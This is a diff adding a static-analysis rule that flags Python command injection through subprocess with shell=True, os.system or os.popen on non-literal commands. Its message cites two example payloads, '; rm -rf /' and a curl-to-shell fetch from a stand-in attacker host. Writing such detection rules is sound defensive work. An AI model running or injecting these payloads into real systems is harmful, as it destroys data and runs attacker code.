@@ -1,0 +1,29 @@
+rules:
+  - id: python-command-injection-shell-true
+    languages: [python]
+    severity: ERROR
+    message: >-
+      Found a call to `subprocess` (or `os.system`/`os.popen`) with `shell=True`
+      and a command that is not a fixed literal string. If any part of the
+      command is influenced by user input, this allows arbitrary OS command
+      injection (e.g. appending `; rm -rf /` or `$(curl attacker.com/x.sh | sh)`).
+      Avoid `shell=True` with dynamic input; pass the command as a list of
+      arguments instead (`subprocess.run(["ls", user_dir])`), or strictly
+      validate/allow-list the input.
+    metadata:
+      category: security
+      confidence: MEDIUM
+      cwe: "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+      owasp:
+        - "A03:2021 - Injection"
+      references:
+        - https://cwe.mitre.org/data/definitions/78.html
+        - https://docs.python.org/3/library/subprocess.html#security-considerations
+    patterns:
+      - pattern-either:
+          - pattern: subprocess.$FUNC($CMD, ..., shell=True, ...)
+          - pattern: os.system($CMD)
+          - pattern: os.popen($CMD)
+      - pattern-not: subprocess.$FUNC("...", ..., shell=True, ...)
+      - pattern-not: os.system("...")
+      - pattern-not: os.popen("...")
